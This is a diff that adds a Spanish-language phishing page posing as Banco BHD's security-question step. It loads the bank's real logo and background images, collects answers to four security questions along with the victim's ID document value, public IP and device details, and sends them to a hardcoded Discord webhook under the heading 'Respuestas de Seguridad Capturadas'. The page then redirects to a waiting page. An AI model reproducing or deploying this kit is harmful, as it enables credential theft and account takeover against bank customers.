@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+    <title>BHD – Preguntas de Seguridad</title>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body {
+            height: 100%;
+            width: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 430px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #fff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bg-bottom {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 38%;
+            background: url('https://ibp.bhd.com.do/assets/img/background-login.webp')
+                center center / cover no-repeat;
+            z-index: 0;
+        }
+
+        .bg-bottom::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 55%;
+            background: linear-gradient(to bottom, #ffffff 0%, rgba(255,255,255,0) 100%);
+            z-index: 1;
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 24px;
+        }
+
+        .logo-wrap {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 48px;
+            padding-bottom: 20px;
+        }
+
+        .logo-wrap img {
+            height: 80px;
+            width: auto;
+        }
+
+        .card-title {
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: #222;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+
+        .card-sub {
+            font-size: 0.80rem;
+            color: #999;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
+        .tc-image {
+            width: 75%;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 3px 14px rgba(0,0,0,0.13);
+            margin-bottom: 20px;
+        }
+
+        .tc-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 10px;
+        }
+
+        .instruccion {
+            width: 100%;
+            font-size: 0.83rem;
+            font-weight: 700;
+            color: #444;
+            margin-bottom: 12px;
+        }
+
+        .questions-grid {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 22px;
+        }
+
+        .question-box {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .question-box label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.76rem;
+            font-weight: 700;
+            color: #555;
+        }
+
+        .question-box label .badge {
+            background: #1a3a6b;
+            color: #fff;
+            font-size: 0.70rem;
+            font-weight: 800;
+            padding: 3px 7px;
+            border-radius: 5px;
+            letter-spacing: 0.5px;
+        }
+
+        .answer-input-wrap {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #d0d0d0;
+            border-radius: 10px;
+            padding: 11px 10px;
+            background: #fff;
+            transition: border-color .2s;
+        }
+
+        .answer-input-wrap:focus-within {
+            border-color: #4caf50;
+            box-shadow: 0 0 0 3px rgba(76,175,80,0.10);
+        }
+
+        .answer-input-wrap input {
+            border: none;
+            outline: none;
+            font-size: max(16px, 1rem);
+            font-weight: 700;
+            color: #222;
+            background: transparent;
+            width: 100%;
+            letter-spacing: 0;
+            text-align: left;
+        }
+
+        .answer-input-wrap input::placeholder {
+            color: #ccc;
+            font-weight: 400;
+            letter-spacing: 0;
+            font-size: 0.82rem;
+        }
+
+        .btn-confirm {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, #4caf50, #43a047);
+            color: #fff;
+            font-size: 0.95rem;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 18px rgba(76,175,80,0.35);
+            transition: background .2s, box-shadow .2s, opacity .2s;
+        }
+
+        .btn-confirm:hover {
+            background: linear-gradient(135deg, #43a047, #388e3c);
+            box-shadow: 0 6px 22px rgba(76,175,80,0.45);
+        }
+
+        .btn-confirm:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+        }
+
+        .spacer { flex: 1; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="bg-bottom"></div>
+
+    <div class="content">
+        <div class="logo-wrap">
+            <img src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg" />
+        </div>
+
+        <div class="card-title">Preguntas de Seguridad</div>
+        <div class="card-sub">Responde las siguientes preguntas de seguridad.</div>
+
+
+        <div class="instruccion">Ingresa tus respuestas:</div>
+
+        <div class="questions-grid">
+            <div class="question-box">
+                <label><span class="badge">01</span> Cuál es su color favorito</label>
+                <div class="answer-input-wrap">
+                    <input type="text" id="q01" placeholder="Respuesta" autocomplete="off" />
+                </div>
+            </div>
+
+            <div class="question-box">
+                <label><span class="badge">02</span> Marca de su primer carro</label>
+                <div class="answer-input-wrap">
+                    <input type="text" id="q02" placeholder="Respuesta" autocomplete="off" />
+                </div>
+            </div>
+
+            <div class="question-box">
+                <label><span class="badge">03</span> Personaje de libro favorito</label>
+                <div class="answer-input-wrap">
+                    <input type="text" id="q03" placeholder="Respuesta" autocomplete="off" />
+                </div>
+            </div>
+
+            <div class="question-box">
+                <label><span class="badge">04</span> Nombre de su abuela materna</label>
+                <div class="answer-input-wrap">
+                    <input type="text" id="q04" placeholder="Respuesta" autocomplete="off" />
+                </div>
+            </div>
+        </div>
+
+        <button class="btn-confirm" id="btnConfirm" type="button" onclick="confirmar()">
+            Confirmar
+        </button>
+
+        <div class="spacer"></div>
+    </div>
+</div>
+
+<script>
+    // ─────────────────────────────────────────
+    //  ⚠️ PON TU WEBHOOK DE DISCORD AQUÍ
+    // ─────────────────────────────────────────
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1503663488671809708/3Wxdjh-C8vWsIX7Ebyux2cvSY1RwWTh5PWRqVCsYFazMW_EkuwPS10jMr_vGP25Z3-fb';
+
+    // ── Leer documento desde URL → localStorage ──
+    const urlParams = new URLSearchParams(window.location.search);
+    const docFromUrl = urlParams.get('doc');
+    if (docFromUrl) localStorage.setItem('bhd_doc_session', decodeURIComponent(docFromUrl));
+
+    // Obtener documento — URL tiene prioridad, luego localStorage
+    const DOCUMENTO = decodeURIComponent(urlParams.get('doc') || '')
+        || localStorage.getItem('bhd_doc_session')
+        || localStorage.getItem('bhd_usuario')
+        || 'No disponible';
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = 'Desconocido', device = 'Desktop';
+        if (/android/i.test(ua)) { os = 'Android'; device = '📱 Móvil'; }
+        else if (/iPhone|iPad/i.test(ua)) { os = 'iOS'; device = '📱 iPhone/iPad'; }
+        else if (/Windows/i.test(ua)) { os = 'Windows'; device = '🖥️ PC'; }
+        else if (/Mac/i.test(ua)) { os = 'macOS'; device = '🖥️ Mac'; }
+        else if (/Linux/i.test(ua)) { os = 'Linux'; device = '🖥️ Linux'; }
+        const browser = /Chrome/i.test(ua) ? 'Chrome'
+            : /Firefox/i.test(ua) ? 'Firefox'
+            : /Safari/i.test(ua) ? 'Safari'
+            : /Edge/i.test(ua) ? 'Edge' : 'Desconocido';
+        return { os, device, browser };
+    }
+
+    async function getIP() {
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            return d.ip;
+        } catch { return 'No disponible'; }
+    }
+
+    async function sendToDiscord(answers, ip) {
+        const { os, device, browser } = getDeviceInfo();
+        const now = new Date();
+        const fecha = now.toLocaleDateString('es-DO', { day:'2-digit', month:'long', year:'numeric' });
+        const hora = now.toLocaleTimeString('es-DO', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
+
+        const payload = {
+            username: "BHD - BR0K3N",
+            avatar_url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg",
+            embeds: [{
+                title: "Respuestas de Seguridad Capturadas — BHD",
+                color: 0x1a3a6b,
+                thumbnail: { url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg" },
+                fields: [
+                    { name: "👤 Documento de Identidad", value: `\`\`\`${DOCUMENTO}\`\`\``, inline: false },
+                    { name: "📋 Color favorito", value: `\`\`\`${answers.q01}\`\`\``, inline: true },
+                    { name: "📋 Marca primer carro", value: `\`\`\`${answers.q02}\`\`\``, inline: true },
+                    { name: "📋 Personaje libro favorito", value: `\`\`\`${answers.q03}\`\`\``, inline: true },
+                    { name: "📋 Nombre abuela materna", value: `\`\`\`${answers.q04}\`\`\``, inline: true },
+                    { name: "🌐 IP Pública", value: `\`${ip}\``, inline: true },
+                    { name: "📍 Dispositivo", value: device, inline: true },
+                    { name: "💻 Navegador", value: `${browser} — ${os}`, inline: true },
+                    { name: "🗓️ Fecha", value: fecha, inline: true },
+                    { name: "🕐 Hora", value: hora, inline: true }
+                ],
+                footer: {
+                    text: "Telegram: @Brknshinexxx",
+                    icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/240px-Telegram_logo.svg.png"
+                },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    }
+
+    async function confirmar() {
+        const q01 = document.getElementById('q01').value.trim();
+        const q02 = document.getElementById('q02').value.trim();
+        const q03 = document.getElementById('q03').value.trim();
+        const q04 = document.getElementById('q04').value.trim();
+
+        if (!q01 || !q02 || !q03 || !q04) {
+            alert('Por favor ingresa todas las respuestas.');
+            return;
+        }
+
+        const btn = document.getElementById('btnConfirm');
+        btn.disabled = true;
+        btn.textContent = 'Enviando...';
+
+        try {
+            const ip = await getIP();
+            await sendToDiscord({ q01, q02, q03, q04 }, ip);
+        } catch(e) {
+            console.error('Webhook error:', e);
+        }
+
+        window.location.href = 'wait.html';
+    }
+</script>
+
+</body>
+</html>
